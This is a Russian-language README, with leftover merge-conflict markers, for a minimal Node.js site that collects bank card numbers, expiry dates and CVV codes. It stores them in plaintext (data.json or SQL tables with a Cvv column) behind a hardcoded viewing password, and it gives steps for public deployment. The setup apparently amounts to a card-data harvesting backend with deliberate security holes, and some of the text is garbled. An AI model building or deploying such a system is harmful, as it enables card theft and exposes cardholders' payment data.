<<<<<<< HEAD
# bankcart
Сайт для внесения и сохранение банковских данных 
=======
# Bank Form

Минимальный сайт для ввода и просмотра банковских данных.
Реализован двухвершинный вариант:

- клиент (`index.html`, `userdetails.html` и стили)
- простой сервер на Node.js (`server.js`)

По умолчанию данные сохраняются на сервере в `data.json`. Для просмотра требуется пароль `27032011`.

## Локальный запуск

1. Установите Node.js (12+).
2. В каталоге проекта выполните:
   ```bash
   npm init -y
   npm install express cors
   ```
3. Запустите сервер:
   ```bash
   node server.js
   ```
   по умолчанию он слушает `http://localhost:3000`.
4. Откройте браузер и перейдите на `http://localhost:3000/index.html`.
   - форма отправки будет посылать данные на сервер.
   - для просмотра используйте `userdetails.html` и ввод 파ssword.

## Развертывание

Сервер можно разместить на любом Node-хостинге (Heroku, Vercel, DigitalOcean и т.п.).
Достаточно загрузить файлы и поднять процесс `node server.js`.

Файлы:
- `index.html` — ввод
- `userdetails.html` — просмотр
- `server.js` — API и статический хостинг
- `data.json` — хранилище записей (используется только в простом варианте)

## Использование настоящей базы данных

Если вы хотите, чтобы данные сохранялись в реальную СУБД (например, SQL Server или MySQL), то нужно:

1. Установить соответствующий драйвер (например, `npm install mssql` для SQL Server).
2. Отредактировать `server.js` (см. пример ниже) и создать таблицу.

### Пример для SQL Server

```sql
CREATE DATABASE BankData;
USE BankData;

CREATE TABLE Cards (
  Id INT IDENTITY PRIMARY KEY,
  CardNumber NVARCHAR(50) NOT NULL,
  Expiry NVARCHAR(10) NOT NULL,
  Cvv NVARCHAR(5) NOT NULL,
  Timestamp DATETIME NOT NULL DEFAULT GETDATE()
);
```

В `server.js` подключение можно настроить так:

```js
const sql = require('mssql');
const dbConfig = {
  user: 'sa',
  password: 'ВашПароль',
  server: 'localhost',
  database: 'BankData',
  options: { trustServerCertificate: true }
};

async function addEntry(entry) {
  await sql.connect(dbConfig);
  const { cardNumber, expiry, cvv } = entry;
  await sql.query`INSERT INTO Cards (CardNumber, Expiry, Cvv) VALUES (${cardNumber}, ${expiry}, ${cvv})`;
}

async function getEntries() {
  await sql.connect(dbConfig);
  const result = await sql.query`SELECT * FROM Cards ORDER BY Id`;
  return result.recordset;
}
```

Замените вызовы чтения/записи из `data.json` на использование `addEntry`/`getEntries`.

### Пример для MySQL

```sql
CREATE DATABASE bankdata;
USE bankdata;

CREATE TABLE Cards (
  id INT AUTO_INCREMENT PRIMARY KEY,
  cardNumber VARCHAR(50) NOT NULL,
  expiry VARCHAR(10) NOT NULL,
  cvv VARCHAR(5) NOT NULL,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

И в Node:

```js
const mysql = require('mysql2/promise');
const pool = mysql.createPool({
  host: 'localhost', user: 'root', password: '...', database: 'bankdata'
});

async function addEntry(entry) {
  const { cardNumber, expiry, cvv } = entry;
  await pool.execute('INSERT INTO Cards (cardNumber, expiry, cvv) VALUES (?, ?, ?)', [cardNumber, expiry, cvv]);
}

async function getEntries() {
  const [rows] = await pool.execute('SELECT * FROM Cards ORDER BY id');
  return rows;
}
```

Эти изменения сделают данные доступными на любом устройстве, где бы ни работал сервер. При переходе на внешний хостинг позаботьтесь о безопасности, SSL и конфиденциальности.  

>>>>>>> 58ebc72 (Initial commit with README)
